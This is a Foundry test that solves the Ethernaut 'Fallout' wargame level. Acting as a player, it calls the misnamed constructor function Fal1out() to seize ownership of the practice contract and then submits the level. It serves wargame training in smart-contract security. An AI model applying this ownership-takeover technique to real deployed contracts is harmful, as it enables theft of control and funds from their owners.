// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Fallout/Fallout.sol";
import "../src/Fallout/FalloutFactory.sol";
import "../src/Ethernaut.sol";

contract Fal1outTest is Test {
    Ethernaut ethernaut;
    address player = makeAddr("player");

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 1 ether);
        vm.label(player, "player");
    }

    function test_fal1out_attack() public {
        FalloutFactory falloutFactory = new FalloutFactory();
        ethernaut.registerLevel(falloutFactory);

        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(falloutFactory);
        Fallout ethernautFallout = Fallout(payable(levelAddress));

        console.log("Before contract init owner:", ethernautFallout.owner());
        ethernautFallout.Fal1out();
        console.log("After contract init owner:", ethernautFallout.owner());

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );

        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
